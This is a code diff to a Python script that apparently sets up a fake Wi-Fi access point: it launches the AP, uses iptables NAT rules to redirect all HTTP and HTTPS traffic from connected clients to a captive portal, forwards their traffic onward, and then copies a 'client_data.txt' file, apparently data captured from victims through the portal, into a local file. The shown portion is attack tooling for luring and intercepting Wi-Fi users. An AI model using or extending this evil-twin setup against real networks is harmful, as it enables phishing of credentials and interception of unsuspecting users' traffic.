@@ -118,18 +118,15 @@ def openAP(net_ssid,net_channel,internet_interface,interface):
     # os.system(f'iptables -A FORWARD -i {interface} -j ACCEPT')
     # os.system(f'iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE')
 
-
     # Redirect any request to the captive portal
-    os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 80 -j DNAT  --to-destination {CAPTIVEPORTAL_IP}')
-    os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 443 -j DNAT  --to-destination {CAPTIVEPORTAL_IP}')
-
-
+    # os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 80 -j DNAT  --to-destination {CAPTIVEPORTAL_IP}:80')
+    # os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 443 -j DNAT  --to-destination {CAPTIVEPORTAL_IP}:80')
+    # os.system(f'iptables -t nat -A PREROUTING  -i {internet_interface} -p tcp --dport 53 -j DNAT  --to-destination {CAPTIVEPORTAL_IP}:80')
+    os.system(f'iptables -t nat -A PREROUTING -i {internet_interface} -p tcp -m multiport --dport 80,443 -j DNAT --to-destination {CAPTIVEPORTAL_IP}:80')
+    
     # Enable internet access use the second interface
     os.system(f'iptables -A FORWARD --in-interface {interface} -j ACCEPT')
     os.system(f'iptables -t nat -A POSTROUTING --out-interface {internet_interface} -j MASQUERADE')
-
-
-
 
     # The next section is required only if you are wanting to access the internet through the ethernet connection.
     #os.system(f'sudo iptables -t nat -A  POSTROUTING -o {internet_interface} -j MASQUERADE')
@@ -193,5 +190,6 @@ def openAP(net_ssid,net_channel,internet_interface,interface):
 
 if __name__ == "__main__":
     printFakeApWelcome()
+    print(f'if failed try \"nmcli device set {sys.argv[4]} managed no\"')
     openAP(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
     os.system('cat /var/www/html/client_data.txt >> client_data.txt')
